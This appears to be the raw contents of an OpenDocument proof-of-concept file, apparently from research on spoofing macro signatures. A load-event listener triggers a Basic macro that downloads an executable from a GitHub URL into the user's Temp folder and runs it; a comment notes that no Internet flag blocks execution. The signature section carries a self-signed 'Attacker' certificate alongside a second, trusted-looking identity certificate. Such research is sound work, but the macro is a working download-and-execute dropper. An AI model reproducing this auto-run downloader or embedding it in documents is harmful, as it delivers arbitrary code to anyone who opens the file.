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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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e document downloads a harmless .exe file and executes it via macro created by Attacker!</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Macros were signed by Attacker using a self-signed certificate / private key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2T18:48:00.762000000</meta:creation-date>
    <dc:date>2021-10-12T19:28:24.978000000</dc:date>
    <meta:editing-duration>PT39M23S</meta:editing-duration>
    <meta:editing-cycles>24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2" meta:word-count="27" meta:character-count="167" meta:non-whitespace-character-count="14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	
	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	Dim oSvc as object
	
  	oSvc = createUNOService("com.sun.star.system.SystemShellExecute")
	oSFA = createUNOService ("com.sun.star.ucb.SimpleFileAccess")
	
	sFilePath = "C:\Users\" + environ("USERNAME") + "\AppData\Local\Temp\odfexample.exe"
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 'if file exists, delete it
	End If
	
	DownloadFile("https://github.com/attodf/odf-test/raw/main/odfexample.exe", sFilePath)
	Beep
	oSvc.execute(ConvertToUrl(sFilePath), "", 0)
	REM No Internet flag is set and thus the execution is not blocked.
	
End Sub

	Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                       (ByVal pCaller As Long, _
                        ByVal szURL As String, _
                        ByVal szFileName As String, _
                        ByVal dwReserved As Long, _
                        ByVal lpfnCB As Long) As Long
                        

	Public Function DownloadFile (URL As String, LocalFilename As String) As Boolean 
	    Dim lngRetVal As Long
	    lngRetVal = URLDownloadToFile(0, URL, LocalFilename, 0, 0) 
	    If lngRetVal = 0 Then DownloadFile = True 
	End Function ' DownloadFile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META-INF/macrosignatures.xml><?xml version="1.0" encoding="utf-8"?>
<document-signatures xmlns="urn:oasis:names:tc:opendocument:xmlns:digitalsignature:1.0">
  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#" Id="ID_00f3003c00d5002d006900ac0049007e0081002200f300f200dd00040001004b">
    <SignedInfo>
      <CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
      <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <Reference URI="Basic/Standard/Module1.xml">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>usrkSV/9rltvfAmf4qMNxIjFW/PwvZJtMRZSlchJJkY=</DigestValue>
      </Reference>
      <Reference URI="Basic/Standard/script-lb.xml">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>YHtNslOIjyIUh6suIfdPcqCbSKdkapBteB29RghWD6U=</DigestValue>
      </Reference>
      <Reference URI="Basic/script-lc.xml">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>UCQ7t4v/9vg9N8MGazuwT0lITcSzC/Jeg0s32y/8xaA=</DigestValue>
      </Reference>
      <Reference URI="#ID_00060069009b00c000230048004b004400b600f9006a002a007500db005100e0">
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>IRTFwFUsV9M9pfVRKrAMdrJVPs708TP1GxES9RKqxks=</DigestValue>
      </Reference>
      <Reference URI="#idSignedProperties" Type="http://uri.etsi.org/01903#SignedProperties">
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>m8II0//1s8FjnEk0Axx9YEpOAeNjWgqOGTQYmzbGAmM=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>fjgDLB51aPact4v0pmnMWr0Htl0AFf7f/8zzhGq4twzOMNU8yTdJ7ZixG2krlWwe
PzA1LH6pIVdOQXeAvo/yZ+SAbTYe+2qg93k0/0UcxhlA5L0p//hGZ4SGxMxy7CAC
mjuEqbRml/A5yTr1VXqh+sGkGuBA9n3DaukAldI3romzrs7st3rcf6dGR+jaQIgG
C+LeqcEjQWZXRuVXQt5TTXVlxKxoWSXJqNkP1ETHHNQx8u7dhRHK5gFtSM3QAKMu
EZl2942JIs3fCD18761iWErrWsSknqEdqkjXY47+x7tRkhsMAPRq9w7Odh53T8XS
84Kg0LxlnbFzNLOFTwrXAA==</SignatureValue>
    <KeyInfo>
      <X509Data>
        <X509IssuerSerial>
          <X509IssuerName>C=DE, E=attacker@odf.evil, CN=Attacker</X509IssuerName>
          <X509SerialNumber>561695420339045612699057</X509SerialNumber>
        </X509IssuerSerial>
        <X509Certificate>MIIDKDCCAhCgAwIBAgIKdvGR2yh62BS9sTANBgkqhkiG9w0BAQsFADBCMREwDwYD
VQQDEwhBdHRhY2tlcjEgMB4GCSqGSIb3DQEJARYRYXR0YWNrZXJAb2RmLmV2aWwx
CzAJBgNVBAYTAkRFMB4XDTIxMDEyMTE0Mjk1N1oXDTI2MDEyMTE0Mjk1N1owQjER
MA8GA1UEAxMIQXR0YWNrZXIxIDAeBgkqhkiG9w0BCQEWEWF0dGFja2VyQG9kZi5l
dmlsMQswCQYDVQQGEwJERTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AK6osofLCTQlnLYygA1uvjSYBq11H49cWXyml1dBDaB11uRN+kDu4ZvnU405+28c
44YMce+peNMClsVIQ5xcUOiDMDJhhtx/75txdYyk66SSxQT4u7FnleqJNDbNvmQR
B9DJu59Yx02GOfCn7ILVDQHvlZGMTEapdYDB5pRtVHgNNm20p3oTVd+112Kk3Rou
F63QZIvB1mOVyWxD/fq2FcXdQickeKVZjglXgx+Yy4F8ZYXfFTUBrfYwruBQr/la
Awy4nLjrYC6pRlw8OUHeGnoQx3XXUl0BE7pM96R6Rt0ZPnr9a2hCc1A1FsrEwnoM
WKl/aWJ3Us9jiXsa14x65O0CAwEAAaMgMB4wDwYJKoZIhvcvAQEKBAIFADALBgNV
HQ8EBAMCB4AwDQYJKoZIhvcNAQELBQADggEBAIzYjXj/rx3b/qopHCguCRJunMU9
iRBAXEuiGbNMT6UxlPFpqTNbyqIbEC+jSDQ3A+JKM5RIQDYpyhURJ4ZYUeQ41MuS
hoPTMB3P0i4QAmYXdXkIcyRAcx4UMN0mNc5ZWz3NqT765RzfU4ZJFnluIz+GEf7z
OZx5hxTKHSLrUItN3T9JkJrIwKOaalbehXosiKhbL7dKCO/fTGS9VT1NM0tmZ+Ln
9h0kVjgYUJWOGOnMAEkDWQAIAaOiQUAtBK41+q5Ki1QWW3A7pTTF0luZMaaot2Ab
0hhBY6sm78+r4Ad4Kv9HLawUH6sMU0mQ1Ke1Cz5oHYh9SG9QuPvSAd+eI9U=</X509Certificate>
      </X509Data>
      <X509Data>
        <X509IssuerSerial>
          <X509IssuerName>C=DE, E=attacker@odf.evil, CN=Attacker</X509IssuerName>
          <X509SerialNumber>561695420339045612699057</X509SerialNumber>
        </X509IssuerSerial>
        <X509Certificate>MIIFHDCCBASgAwIBAgIUWOXs9lLclAWdmWJTvdd5SmjIx4owDQYJKoZIhvcNAQEL
BQAwTDELMAkGA1UEBhMCQ0gxEDAOBgNVBAoTB1dJU2VLZXkxKzApBgNVBAMTIldJ
U2VLZXkgQ2VydGlmeUlEIFBlcnNvbmFsIEdCIENBIDQwHhcNMjIwMjEwMTUzNDI3
WhcNMjIwNTExMTQ0NDAwWjCBmDFCMEAGA1UECww5UGVyc29uJ3MgSWRlbnRpdHkg
bm90IFZlcmlmaWVkIC0gV0lTZUlEIEZyZWUgQ2VydGlmaWNhdGVzMSUwIwYDVQQD
DBx0cnVzdGVkLnBlcnNvbi5vZGZAZ21haWwuY29tMSswKQYJKoZIhvcNAQkBFhx0
cnVzdGVkLnBlcnNvbi5vZGZAZ21haWwuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEAnmTs5AtJ2EmImpEknmq6zdWEILLmQiiarTmigqsBMntesnUi
Enk9TFuv6G9hMMbFmCJDy9PMhDTcfZZY5jah3ZjZd1IUmAGilCW4h68KTMufPKfg
weiGZnqCXuZdboH7JxMxPihLov0iCqHPFFH9xXY0jGG9RkCYhl2b56ivvwNpkTCD
1bP0DCqpF7xFZFigBmTYMB9U3VPnAg+hocl8lF2fe13/dYUSPs6tR44KyKIRdnfj
6oTTI/pUlChPUMtot4vNgGlkNw/+aOiCFkhVKqidL22PCgrZUyCsEzD/h5Q8L2K9
/xxVSpAzzFNRhSeulGdRXArjT+05Y+zBjXPPsQIDAQABo4IBpzCCAaMwDAYDVR0T
AQH/BAIwADAfBgNVHSMEGDAWgBTbaCwDV3rMPWxpoTmgm7+wihlXsTBwBggrBgEF
BQcBAQRkMGIwOwYIKwYBBQUHMAKGL2h0dHA6Ly9wdWJsaWMud2lzZWtleS5jb20v
Y3J0L3djaWRwZXJzZ2JjYTQuY2VyMCMGCCsGAQUFBzABhhdodHRwOi8vb2NzcC53
aXNla2V5LmNvbTAnBgNVHREEIDAegRx0cnVzdGVkLnBlcnNvbi5vZGZAZ21haWwu
Y29tMEcGA1UdIARAMD4wPAYIYIV0BQ4HBAEwMDAuBggrBgEFBQcCARYiaHR0cDov
L3d3dy53aXNla2V5LmNvbS9yZXBvc2l0b3J5LzBABgNVHR8EOTA3MDWgM6Axhi9o
dHRwOi8vcHVibGljLndpc2VrZXkuY29tL2NybC93Y2lkcGVyc2diY2E0LmNybDAd
BgNVHQ4EFgQU+DXlKPw/8UzjxvBEo+QGJDjrgWcwHQYDVR0lBBYwFAYIKwYBBQUH
AwIGCCsGAQUFBwMEMA4GA1UdDwEB/wQEAwIFoDANBgkqhkiG9w0BAQsFAAOCAQEA
LTdfqbp4+dIEhFG6b7KLGVdWAgrrEFoUveMiLIGVfaP+k+Q4RM8pNQtvgbjjVUfw
FYuOlCIEEhBBHAfF59/4CPXn8ySxI+J2rH48UC3nrxf8OlPxxY/KAbuweorIlLtm
2P/LhnrvO8CXn8g3uW5DRQLgk0cW7go9pawJqOEwHuPXZQF8hUBAqOlJzWU+MeFS
unVhQ8k9tc2PcFYZYlvp8Rgy0udDgJVeFcn0QEruvEL+RlIhrmDPtPrUzYAdLOMz
xGjcvBVWHiXpatNXjD0XAUg7HLxQ4NjXl0eZeFTb1YoRnJt/SQ6wfA9BiqN/wc26
FKY8qLg8QRscubNgex1DMA==</X509Certificate>
      </X509Data>
    </KeyInfo>
    <Object>
      <SignatureProperties>
        <SignatureProperty Id="ID_00060069009b00c000230048004b004400b600f9006a002a007500db005100e0" Target="#ID_00f3003c00d5002d006900ac0049007e0081002200f300f200dd00040001004b">
          <dc:date xmlns:dc="http://purl.org/dc/elements/1.1/">2021-10-12T19:28:31.246000000</dc:date>
        </SignatureProperty>
      </SignatureProperties>
    </Object>
    <Object xmlns:xd="http://uri.etsi.org/01903/v1.3.2#">
      <xd:QualifyingProperties Target="#ID_00f3003c00d5002d006900ac0049007e0081002200f300f200dd00040001004b">
        <xd:SignedProperties Id="idSignedProperties">
          <xd:SignedSignatureProperties>
            <xd:SigningTime>2021-10-12T19:28:31.246000000</xd:SigningTime>
            <xd:SigningCertificate>
              <xd:Cert>
                <xd:CertDigest>
                  <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
                  <DigestValue>FwThltt8pDHa8UHavxKtX5lEIC44xGy8N4DbIxXSBpY=</DigestValue>
                </xd:CertDigest>
                <xd:IssuerSerial>
                  <X509IssuerName>C=DE, E=attacker@odf.evil, CN=Attacker</X509IssuerName>
                  <X509SerialNumber>561695420339045612699057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>
              <xd:EncapsulatedX509Certificate>MIIDKDCCAhCgAwIBAgIKdvGR2yh62BS9sTANBgkqhkiG9w0BAQsFADBCMREwDwYDVQQDEwhBdHRhY2tlcjEgMB4GCSqGSIb3DQEJARYRYXR0YWNrZXJAb2RmLmV2aWwxCzAJBgNVBAYTAkRFMB4XDTIxMDEyMTE0Mjk1N1oXDTI2MDEyMTE0Mjk1N1owQjERMA8GA1UEAxMIQXR0YWNrZXIxIDAeBgkqhkiG9w0BCQEWEWF0dGFja2VyQG9kZi5ldmlsMQswCQYDVQQGEwJERTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK6osofLCTQlnLYygA1uvjSYBq11H49cWXyml1dBDaB11uRN+kDu4ZvnU405+28c44YMce+peNMClsVIQ5xcUOiDMDJhhtx/75txdYyk66SSxQT4u7FnleqJNDbNvmQRB9DJu59Yx02GOfCn7ILVDQHvlZGMTEapdYDB5pRtVHgNNm20p3oTVd+112Kk3RouF63QZIvB1mOVyWxD/fq2FcXdQickeKVZjglXgx+Yy4F8ZYXfFTUBrfYwruBQr/laAwy4nLjrYC6pRlw8OUHeGnoQx3XXUl0BE7pM96R6Rt0ZPnr9a2hCc1A1FsrEwnoMWKl/aWJ3Us9jiXsa14x65O0CAwEAAaMgMB4wDwYJKoZIhvcvAQEKBAIFADALBgNVHQ8EBAMCB4AwDQYJKoZIhvcNAQELBQADggEBAIzYjXj/rx3b/qopHCguCRJunMU9iRBAXEuiGbNMT6UxlPFpqTNbyqIbEC+jSDQ3A+JKM5RIQDYpyhURJ4ZYUeQ41MuShoPTMB3P0i4QAmYXdXkIcyRAcx4UMN0mNc5ZWz3NqT765RzfU4ZJFnluIz+GEf7zOZx5hxTKHSLrUItN3T9JkJrIwKOaalbehXosiKhbL7dKCO/fTGS9VT1NM0tmZ+Ln9h0kVjgYUJWOGOnMAEkDWQAIAaOiQUAtBK41+q5Ki1QWW3A7pTTF0luZMaaot2Ab0hhBY6sm78+r4Ad4Kv9HLawUH6sMU0mQ1Ke1Cz5oHYh9SG9QuPvSAd+eI9U=</xd:EncapsulatedX509Certificate>
            </xd:CertificateValues>
          </xd:UnsignedSignatureProperties>
        </xd:UnsignedProperties>
      </xd:QualifyingProperties>
    </Object>
  </Signature>
</document-signatures>
</file>